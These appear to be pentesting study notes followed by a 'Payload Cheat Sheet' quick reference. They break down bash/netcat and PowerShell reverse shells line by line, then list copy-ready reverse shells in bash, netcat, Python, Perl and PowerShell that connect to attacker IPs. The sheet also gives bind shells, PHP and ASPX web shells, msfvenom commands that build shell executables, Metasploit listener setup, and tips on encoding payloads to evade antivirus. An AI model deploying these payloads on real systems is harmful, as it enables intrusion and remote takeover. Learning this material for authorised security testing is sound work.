# 1️⃣ What Is a Payload?

A **payload** is the actual command or code that performs the intended action when delivered to a target system.

### Basic Definition Table

|Context|Meaning of Payload|
|---|---|
|Networking|The actual data inside a packet|
|Email/Text|The message content|
|Cybersecurity|The code that executes malicious or exploit actions|
|Pentesting|Code that gives shell access or executes commands|

---

## 📊 Payload Concept Visualization

![Image](https://media.hswstatic.com/eyJidWNrZXQiOiJjb250ZW50Lmhzd3N0YXRpYy5jb20iLCJrZXkiOiJnaWZcL3F1ZXN0aW9uNTI1LXBhY2tldC5naWYiLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjI5MH19fQ%3D%3D)

![Image](https://cdn.sanity.io/images/r09655ln/production/2a1d3990137d50453af4d5f422410611f37ea189-728x400.png)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://www.mdpi.com/applsci/applsci-13-07161/article_deploy/html/images/applsci-13-07161-g001-550.jpg)

---

# 2️⃣ Payload in Penetration Testing

In information security, the payload is:

- The command and/or code
    
- That exploits a vulnerability
    
- And performs actions on the target system
    

Examples of payload actions:

|Payload Action|Result|
|---|---|
|Reverse shell|Remote command execution|
|Bind shell|Open listener on target|
|Meterpreter|Advanced remote control|
|File download|Download malware|
|Privilege escalation|Gain admin/root access|

---

# 3️⃣ Important Concept: Payload = Instructions

Payloads are NOT magic. They are simply instructions given to the operating system.

Just like:

```bash
ls
```

tells Linux to list files,

a payload tells the system to:

- Connect to attacker
    
- Execute shell
    
- Send command output
    

---

# 4️⃣ Linux Netcat/Bash Reverse Shell One-Liner Breakdown

Full Payload:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

This payload creates a reverse shell.

---

# 5️⃣ Step-by-Step Breakdown Table

## Remove Existing File

```bash
rm -f /tmp/f;
```

|Component|Purpose|
|---|---|
|rm|Remove file|
|-f|Force remove|
|/tmp/f|File location|
|;|Execute next command|

---

## Create Named Pipe

```bash
mkfifo /tmp/f;
```

|Component|Purpose|
|---|---|
|mkfifo|Create named pipe|
|/tmp/f|Pipe name|
|;|Next command|

Named pipes allow two-way communication.

---

## Read Input from Pipe

```bash
cat /tmp/f |
```

|Component|Purpose|
|---|---|
|cat|Read data|
|/tmp/f|Pipe source|
|||

---

## Start Interactive Bash Shell

```bash
/bin/bash -i 2>&1 |
```

|Component|Purpose|
|---|---|
|/bin/bash|Bash interpreter|
|-i|Interactive mode|
|2>&1|Redirect errors to output|
|||

---

## Connect to Attacker via Netcat

```bash
nc 10.10.14.12 7777 > /tmp/f
```

|Component|Purpose|
|---|---|
|nc|Netcat|
|10.10.14.12|Attacker IP|
|7777|Attacker port|
|> /tmp/f|Send output back|

---

## 📊 Reverse Shell Communication Flow

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6915b40b4d0c9f662902ed94_5cc923e6.png)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

---

# 6️⃣ PowerShell Reverse Shell One-Liner Breakdown

Full payload:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);..."
```

---

# 7️⃣ PowerShell Payload Step-by-Step Breakdown

## Start PowerShell

```powershell
powershell -nop -c
```

|Component|Purpose|
|---|---|
|powershell|Start PowerShell|
|-nop|No profile|
|-c|Execute command|

---

## Create TCP Connection

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```

|Component|Purpose|
|---|---|
|New-Object|Create new object|
|TCPClient|Network client|
|IP|Attacker IP|
|Port|Attacker port|

This connects target → attacker.

---

## Create Network Stream

```powershell
$stream = $client.GetStream();
```

|Component|Purpose|
|---|---|
|GetStream|Enables communication|

---

## Create Byte Array

```powershell
[byte[]]$bytes = 0..65535|%{0};
```

|Component|Purpose|
|---|---|
|byte[]|Byte array|
|65535|Max buffer|
|%{0}|Initialize with zeros|

---

## Read Commands from Attacker

```powershell
$stream.Read($bytes, 0, $bytes.Length)
```

Reads commands from attacker.

---

## Execute Commands

```powershell
iex $data
```

|Component|Purpose|
|---|---|
|iex|Invoke-Expression|
|Executes received command||

---

## Send Results Back

```powershell
$stream.Write($sendbyte,0,$sendbyte.Length)
```

Sends command output to attacker.

---

## Close Connection

```powershell
$client.Close()
```

Terminates session.

---

# 8️⃣ PowerShell Reverse Shell Flow Diagram

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/676182bc78b8b88106a17157_626822d9beb1b531fd597ae2_Reverse%2520Shell%2520in%2520action.jpeg)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://miro.medium.com/1%2AMsEQUM0AFi2DICOmfk7mRg.png)

![Image](https://miro.medium.com/1%2ACyVqkmA7wLYaippCGRXW5w.jpeg)

---

# 9️⃣ Payloads Can Be Different Forms

Payloads are not always one-liners.

They can be:

|Payload Type|Example|
|---|---|
|One-liner|Bash reverse shell|
|Script|PowerShell .ps1|
|Binary|.exe|
|Web shell|.php|
|Framework payload|Metasploit Meterpreter|

---

# 🔟 Example: Nishang PowerShell Payload

Project: Nishang

Function:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.10 -Port 4444
```

This creates reverse shell.

---

# 1️⃣1️⃣ Why Antivirus Blocks Payloads

AV detects payloads because they:

- Open network connections
    
- Execute commands remotely
    
- Modify system behavior
    
- Access sensitive areas
    

Example: Windows Defender blocked PowerShell payload earlier.

---

# 1️⃣2️⃣ Payload Selection Depends on Target

Payload depends on:

|Factor|Example|
|---|---|
|OS|Linux, Windows|
|Shell|Bash, PowerShell|
|Installed tools|Netcat, Python|
|Security protections|AV, Firewall|
|Architecture|x86, x64|

---

# 1️⃣3️⃣ Common Payload Types

|Payload|OS|
|---|---|
|Bash reverse shell|Linux|
|PowerShell reverse shell|Windows|
|Meterpreter|Windows/Linux|
|PHP web shell|Web servers|
|Python reverse shell|Linux|

---

# 1️⃣4️⃣ Payload Execution Flow

```text
Exploit → Payload executes → Target connects → Attacker gets shell
```

---

# 1️⃣5️⃣ Payload Generation Tools

|Tool|Purpose|
|---|---|
|Netcat|Manual shells|
|msfvenom|Payload generator|
|Metasploit|Automated exploitation|
|Nishang|PowerShell payloads|
|Empire|Post exploitation|

---

# 1️⃣6️⃣ Key Pentester Takeaways

|Important Concept|Explanation|
|---|---|
|Payload = instructions|Not magic|
|Payload executes commands|Remote control|
|OS determines payload type|Linux vs Windows|
|AV blocks suspicious payloads|Must bypass|
|Payload can be script or binary|Multiple forms|

---

# 1️⃣7️⃣ Summary

|Concept|Meaning|
|---|---|
|Payload|Code executed on target|
|Purpose|Gain shell / execute commands|
|Types|Bash, PowerShell, Meterpreter|
|Delivery|Exploit, manual, framework|
|Goal|Remote system control|

---

# 💣 Payload Cheat Sheet (Table Format) – Pentester Quick Reference

---

# 1️⃣ Payload Basics

|Term|Definition|
|---|---|
|Payload|Code executed on target after exploitation|
|Purpose|Gain shell, execute commands, control system|
|Delivered via|Exploit, file upload, command injection|
|Runs on|Target system|
|Controlled by|Attacker|

---

# 2️⃣ Payload Types Overview

|Payload Type|Description|Example|
|---|---|---|
|Reverse Shell|Target connects back to attacker|bash reverse shell|
|Bind Shell|Target listens for attacker|nc bind shell|
|Meterpreter|Advanced shell|Metasploit Meterpreter|
|Web Shell|Web-based shell|PHP web shell|
|Staged Payload|Loads in stages|windows/meterpreter/reverse_tcp|
|Stageless Payload|Fully self-contained|windows/meterpreter_reverse_tcp|

---

# 3️⃣ Reverse Shell Payloads

## Linux Reverse Shells

|Tool|Payload|
|---|---|
|Bash|`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`|
|Netcat|`nc ATTACKER_IP 4444 -e /bin/bash`|
|Python|`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`|
|Perl|`perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'`|

---

## Windows Reverse Shells

|Tool|Payload|
|---|---|
|Netcat|`nc.exe ATTACKER_IP 4444 -e cmd.exe`|
|PowerShell|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);..."`|
|PowerShell Simple|`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)`|

---

# 4️⃣ Bind Shell Payloads

## Linux Bind Shell

|Tool|Payload|
|---|---|
|Netcat|`nc -lvnp 4444 -e /bin/bash`|
|Bash|`/bin/bash -i`|

---

## Windows Bind Shell

|Tool|Payload|
|---|---|
|Netcat|`nc.exe -lvnp 4444 -e cmd.exe`|

---

# 5️⃣ Web Shell Payloads

## PHP Web Shell

|Payload|
|---|
|`<?php system($_GET['cmd']); ?>`|

Access:

```id="plcs1"
http://target/shell.php?cmd=whoami
```

---

## ASPX Web Shell

|Payload|
|---|
|`<% eval request("cmd") %>`|

---

# 6️⃣ msfvenom Payload Creation

## Windows Payload

|Purpose|Command|
|---|---|
|Create exe payload|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe`|

---

## Linux Payload

|Purpose|Command|
|---|---|
|Create elf payload|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf`|

---

## Web Payload

|Purpose|Command|
|---|---|
|PHP payload|`msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php`|

---

# 7️⃣ Meterpreter Payloads

|Payload|Description|
|---|---|
|windows/meterpreter/reverse_tcp|Windows Meterpreter reverse shell|
|linux/x64/meterpreter/reverse_tcp|Linux Meterpreter|
|php/meterpreter_reverse_tcp|PHP Meterpreter|

---

# 8️⃣ Listener Setup (Attacker)

|Tool|Command|
|---|---|
|Netcat|`nc -lvnp 4444`|
|Metasploit|`use exploit/multi/handler`|

Metasploit example:

```bash
set payload windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

---

# 9️⃣ Staged vs Stageless Payloads

|Type|Description|
|---|---|
|Staged|Loads payload in parts|
|Stageless|Complete payload delivered at once|

Examples:

|Type|Payload|
|---|---|
|Staged|windows/meterpreter/reverse_tcp|
|Stageless|windows/meterpreter_reverse_tcp|

---

# 🔟 Payload File Formats

|Format|OS|
|---|---|
|.exe|Windows|
|.elf|Linux|
|.php|Web|
|.ps1|PowerShell|
|.asp|ASP|
|.aspx|ASP.NET|

---

# 1️⃣1️⃣ Payload Delivery Methods

|Method|Example|
|---|---|
|Exploit|EternalBlue|
|File Upload|Upload shell.exe|
|Command Injection|Reverse shell one-liner|
|Web upload|PHP shell|
|Phishing|Malicious attachment|

---

# 1️⃣2️⃣ Payload Verification Commands

After shell access:

|Command|Purpose|
|---|---|
|whoami|Current user|
|hostname|System name|
|pwd|Current directory|
|id|User privileges|
|uname -a|System info|

---

# 1️⃣3️⃣ Common Payload Locations

|Location|OS|
|---|---|
|/tmp|Linux|
|/dev/shm|Linux|
|C:\Windows\Temp|Windows|
|C:\Users\Public|Windows|

---

# 1️⃣4️⃣ Payload Troubleshooting

|Problem|Solution|
|---|---|
|No connection|Check listener|
|AV blocking|Use encoded payload|
|Wrong architecture|Use correct x86/x64|
|Firewall blocking|Use reverse shell|

---

# 1️⃣5️⃣ Quick Reference (Most Important)

|Task|Command|
|---|---|
|Start listener|nc -lvnp 4444|
|Linux reverse shell|bash -i >& /dev/tcp/IP/4444 0>&1|
|Windows reverse shell|nc.exe IP 4444 -e cmd.exe|
|Create payload|msfvenom -p windows/shell_reverse_tcp|
|Web shell||

---

# 1️⃣6️⃣ Pentester Payload Workflow

|Step|Action|
|---|---|
|1|Find vulnerability|
|2|Select payload|
|3|Start listener|
|4|Deliver payload|
|5|Gain shell|
|6|Escalate privileges|

---
